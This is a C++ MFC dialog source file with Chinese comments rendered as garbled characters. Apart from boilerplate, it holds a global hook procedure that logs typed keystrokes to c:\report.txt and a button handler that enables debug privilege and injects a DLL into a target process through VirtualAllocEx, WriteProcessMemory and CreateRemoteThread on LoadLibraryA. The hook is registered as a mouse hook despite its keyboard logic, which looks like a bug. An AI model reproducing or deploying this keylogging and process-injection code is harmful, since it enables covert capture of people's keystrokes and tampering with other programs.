// GlobalAppDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "GlobalApp.h"
#include "GlobalAppDlg.h"
#include "windows.h"
#include "process.h"
#include "tlhelp32.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

static HHOOK hHook = NULL;
HINSTANCE hInstance;


LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(
		int nCode, 
		WPARAM wParam, 
		LPARAM lParam)
{
	char ch;			
	if (((DWORD)lParam & 0x40000000) &&
		(HC_ACTION==nCode))
	{
		if ((wParam == VK_SPACE)||
			(wParam == VK_RETURN)||
			(wParam >= 0x2f) && (wParam <= 0x100)) 
		{
			FILE *file =fopen("c:\\report.txt","a+");
			if (wParam==VK_RETURN)
			{	
				ch='\n';
				fwrite(&ch,1,1,file);
			}
			else{
				BYTE ks[256];
				GetKeyboardState(ks);
				WORD w;
				UINT scan;
				scan=0;
				ToAscii(wParam,scan,ks,&w,0);
				ch =char(w); 
				fwrite(&ch,1,1,file);
			}
			fclose(file);
		}
	}

	LRESULT RetVal = CallNextHookEx( hHook, nCode, wParam, lParam);	
	return  RetVal;
}
// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// �Ի�������
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CGlobalAppDlg �Ի���




CGlobalAppDlg::CGlobalAppDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CGlobalAppDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CGlobalAppDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CGlobalAppDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(ID_HOOK, &CGlobalAppDlg::OnBnClickedHook)
	ON_BN_CLICKED(ID_UNHOOK, &CGlobalAppDlg::OnBnClickedUnhook)
	ON_BN_CLICKED(IDC_IMPORT_HOOK_BUTTON, &CGlobalAppDlg::OnBnClickedImportHookButton)
	ON_BN_CLICKED(IDC_INJECT_DLL_BUTTON, &CGlobalAppDlg::OnBnClickedInjectDllButton)
END_MESSAGE_MAP()


// CGlobalAppDlg ��Ϣ�������

BOOL CGlobalAppDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	AFX_MANAGE_STATE(AfxGetStaticModuleState());
	hInstance = AfxGetInstanceHandle();


	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CGlobalAppDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CGlobalAppDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CGlobalAppDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}


void CGlobalAppDlg::OnBnClickedHook()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	//HMODULE hModule = LoadLibrary (L"GlobalHook.dll");
	//GetProcAddress (hModule, "");
	hHook = SetWindowsHookEx (WH_MOUSE, (HOOKPROC)KeyboardProc, hInstance, 0);

}

void CGlobalAppDlg::OnBnClickedUnhook()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	UnhookWindowsHookEx(hHook);
}

void CGlobalAppDlg::OnBnClickedImportHookButton()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	MessageBoxA (NULL, "Test", "Test", 0);
}

void CGlobalAppDlg::OnBnClickedInjectDllButton()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	OutputDebugString (L"Inject dll entry.\n");

	WCHAR *pwchProsess = L"xxx.exe";
	char *pchDll = "xxx.dll";

	HANDLE hToken;
	if (!OpenProcessToken (GetCurrentProcess (), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		OutputDebugString (L"OpenProcessToken Error.\n");
		return;
	}

	LUID luid;
	if (!LookupPrivilegeValue (NULL, SE_DEBUG_NAME,&luid))
	{
		OutputDebugString (L"LookupPrivilegeValue Error.\n");
		return;
	}

	TOKEN_PRIVILEGES tp;
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;

	if (!AdjustTokenPrivileges (hToken, 0, &tp, sizeof (TOKEN_PRIVILEGES), NULL, NULL))
	{
		OutputDebugString (L"AdjustTokenPrivileges Error.\n");
		return;
	}

	HANDLE hSnap;
	HANDLE hkernel32;
	PROCESSENTRY32 pe;
	BOOL bNext;

	pe.dwSize = sizeof (pe);
	hSnap = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, 0);
	bNext = Process32First (hSnap, &pe);
	while (bNext)
	{
		if (!wcscmp (pe.szExeFile, pwchProsess)){
			hkernel32 = OpenProcess (PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION,FALSE, pe.th32ProcessID);
			OutputDebugString (L"Hookapi: OpenProcess.\n");
			break;
		}
		bNext = Process32Next (hSnap, &pe);
	}

	CloseHandle  (hSnap);

	LPVOID lpAddr;
	FARPROC pfn;

	lpAddr = VirtualAllocEx (hkernel32, NULL, strlen (pchDll), MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory (hkernel32, lpAddr, pchDll, strlen(pchDll), NULL);
	pfn = GetProcAddress (GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
	CreateRemoteThread(hkernel32,NULL,0,(LPTHREAD_START_ROUTINE)pfn,lpAddr,NULL,0);

}
